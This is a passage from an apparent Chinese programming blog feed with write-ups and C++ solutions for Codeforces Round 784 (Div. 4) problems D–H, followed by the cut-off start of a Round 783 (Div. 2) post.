&#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="D-Colorful-Stamp"><a href="#D-Colorful-Stamp" class="headerlink" title="D. Colorful Stamp"></a>D. Colorful Stamp</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/22/codeforces%20round%20784(div.4)/4.png" alt="4"></p><h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>有一个长度为2的红蓝印章，每次打印上去可以使相邻两个格子的颜色一个为红，一个为蓝，颜色可以覆盖。那么格子将出现三种状态：白，红，蓝。我们以白色方格作为分割，容易发现不可能存在长度为1的红色或者蓝色色块，所以只有一个格子的时候那个格子必为白色，不可能是红色或者蓝色。对于一个连续的色块，可以发现必须同时存在蓝色和红色。因此只要所有的连续色块满足这个要求就可以啦。</p><h3 id="标程-3"><a href="#标程-3" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;ma;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">200005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[<span class="number">0</span>]==<span class="string">&#x27;W&#x27;</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    s[n++]=<span class="string">&#x27;W&#x27;</span>;</span><br><span class="line">    <span class="keyword">int</span> flag=<span class="number">0</span>,len=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==<span class="string">&#x27;W&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(len==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> ;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(len&gt;<span class="number">1</span>&amp;&amp;flag!=<span class="number">3</span>)&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> ;</span><br><span class="line">            &#125;</span><br><span class="line">            len=<span class="number">0</span>;</span><br><span class="line">            flag=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            len++;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==<span class="string">&#x27;R&#x27;</span>)&#123;</span><br><span class="line">                flag|=<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==<span class="string">&#x27;B&#x27;</span>)&#123;</span><br><span class="line">                flag|=<span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="E-2-Letter-Strings"><a href="#E-2-Letter-Strings" class="headerlink" title="E. 2-Letter Strings"></a>E. 2-Letter Strings</h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/22/codeforces%20round%20784(div.4)/5.png" alt="5"></p><h3 id="题目分析-4"><a href="#题目分析-4" class="headerlink" title="题目分析"></a>题目分析</h3><p>给定若干个长度只有2的字符串，要求输出符合要求的对数，要求为两对字符串有且仅有1个位置字符不一样。由于数据点较小，我们很容易想到把字符串转int类型比较，由于字符只有11种，理论上可以一个char压缩字符串，但是我选择用short进行，因为复杂度绰绰有余。</p><p>然后对于转换成的整数类型进行比较，若发现高位或者低位相同，则将答案加上 $num[i]*num[j]$，题目已经提示long long，其它的也没啥了。</p><h3 id="标程-4"><a href="#标程-4" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;ma;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">3000</span>;</span><br><span class="line"><span class="keyword">int</span> a[N+<span class="number">10</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">5</span>];</span><br><span class="line">    <span class="built_in">memset</span>(a,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(a));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">        a[((s[<span class="number">0</span>]-<span class="string">&#x27;a&#x27;</span>)&lt;&lt;<span class="number">8</span>)|(s[<span class="number">1</span>]-<span class="string">&#x27;a&#x27;</span>)]++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;=N;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>( (i&amp;<span class="number">0x0000ff00</span>)==(j&amp;<span class="number">0x0000ff00</span>)||(i&amp;<span class="number">0x000000ff</span>)==(j&amp;<span class="number">0x000000ff</span>) )&#123;</span><br><span class="line">                <span class="keyword">if</span>(a[i]&amp;&amp;a[j])&#123;</span><br><span class="line">                    ans+=<span class="number">1ll</span>*a[i]*a[j];</span><br><span class="line">                    <span class="comment">//printf(&quot;0x%x 0x%x\n&quot;,i,j);</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;%d\n&quot;,a[0x101]);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="F-Eating-Candies"><a href="#F-Eating-Candies" class="headerlink" title="F. Eating Candies"></a>F. Eating Candies</h2><h3 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/22/codeforces%20round%20784(div.4)/6.png" alt="6"></p><h3 id="题目分析-5"><a href="#题目分析-5" class="headerlink" title="题目分析"></a>题目分析</h3><p>就是一个人只能从左吃，另一个人只能从右开始吃，问最后吃的重量一样的情况下的最多糖果。这个直接贪心好了，如果左边人少了那就左边的人吃，否则右边的人吃，一旦重量一样了保存结果，最后输出即可。</p><h3 id="标程-5"><a href="#标程-5" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;ma;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">2e5</span>;</span><br><span class="line"><span class="keyword">int</span> w[N+<span class="number">10</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;w[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">1</span>,j=n;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">0</span>,b=<span class="number">0</span>,ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=j)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a==b)&#123;</span><br><span class="line">            ans=i<span class="number">-1</span>+n-j;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(a&lt;b)&#123;</span><br><span class="line">            a+=w[i];</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            b+=w[j];</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//printf(&quot;%d %d\n&quot;,i,j);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(a==b)ans=n;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="G-Fall-Down"><a href="#G-Fall-Down" class="headerlink" title="G. Fall Down"></a>G. Fall Down</h2><h3 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/22/codeforces%20round%20784(div.4)/7.png" alt="7"></p><h3 id="题目分析-6"><a href="#题目分析-6" class="headerlink" title="题目分析"></a>题目分析</h3><p>模拟题，直接按要求下落石块就行，注意判断一下下落条件即可。</p><h3 id="标程-6"><a href="#标程-6" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;ma;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">55</span>][<span class="number">55</span>];</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fall</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="comment">//a[y++][x];</span></span><br><span class="line">    <span class="keyword">while</span>(y!=n&amp;&amp;a[y+<span class="number">1</span>][x]==<span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">        a[y][x]=<span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">        y++;</span><br><span class="line">        a[y][x]=<span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    string s;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;s;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m;j++)&#123;</span><br><span class="line">            a[i][j]=s[j<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n<span class="number">-1</span>;i&gt;=<span class="number">1</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(a[i][j]==<span class="string">&#x27;*&#x27;</span>)&#123;</span><br><span class="line">                <span class="built_in">fall</span>(j,i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m;j++)&#123;</span><br><span class="line">            <span class="built_in">putchar</span>(a[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="H-Maximal-AND"><a href="#H-Maximal-AND" class="headerlink" title="H. Maximal AND"></a>H. Maximal AND</h2><h3 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/22/codeforces%20round%20784(div.4)/8.png" alt="8"></p><h3 id="题目分析-7"><a href="#题目分析-7" class="headerlink" title="题目分析"></a>题目分析</h3><p>有k次机会让某一个数的二进制位变成1，最后求所有数的与最大值。我们直接统计所有位的情况，从最高位开始，如果当前k的值允许变为全1则直接给了，然后答案加上那一位即可。</p><h3 id="标程-7"><a href="#标程-7" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;ma;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">60</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_bit</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(x)&#123;</span><br><span class="line">        <span class="keyword">if</span>(x&amp;<span class="number">1</span>)&#123;</span><br><span class="line">            a[i]++;</span><br><span class="line">        &#125;</span><br><span class="line">        x&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,k;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;k;</span><br><span class="line">    <span class="built_in">memset</span>(a,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(a));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> x;</span><br><span class="line">        cin&gt;&gt;x;</span><br><span class="line">        <span class="built_in">get_bit</span>(x);</span><br><span class="line">        <span class="comment">//puts(&quot;1&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">30</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">if</span>(k&gt;=n-a[i])&#123;</span><br><span class="line">            k-=n-a[i];</span><br><span class="line">            ans|=(<span class="number">1</span>&lt;&lt;i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一次在cf上ak，也算成功吧，虽然都挺简单的hhh。</p><p><img src="/2022/04/22/codeforces%20round%20784(div.4)/9.png" alt="9"></p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> codeforces </category>
          
          <category> 签到 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>codeforces round 783(Div.2)解析</title>
      <link href="/2022/04/20/codeforces%20round%20783(div.2)/"/>
      <url>/2022/04/20/codeforces%20round%20783(div.2)/</url>
      
        <content type="html"><![CDATA[<p><a href="https://codeforces.com/contest/1668">Codeforces Round #783 (Div. 2)</a></p><span id="more"></span><h2 id="A-Direction-Change"><a href="#A-Direction-Change" class="headerlink" title="A. Direction Change"></a>A. Direction Change</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/20/codeforces%20round%20783(div.2)/1.png" alt="1"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>不难发现，我最优的路线只能是向右或者向下走。我先不妨设 $m\ge n$，如果走到底了，不得以我只能向上转变方向然后再右下，这样循环走直到终点，只考虑到了最后一行的情况，不难发现，每次长度+1变为奇数时，走的步数+1，否则+3。最后特判一下走不了的情况，当只有一行且有超过2列的情况为走不了。</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">if</span>(n&gt;m)&#123;<span 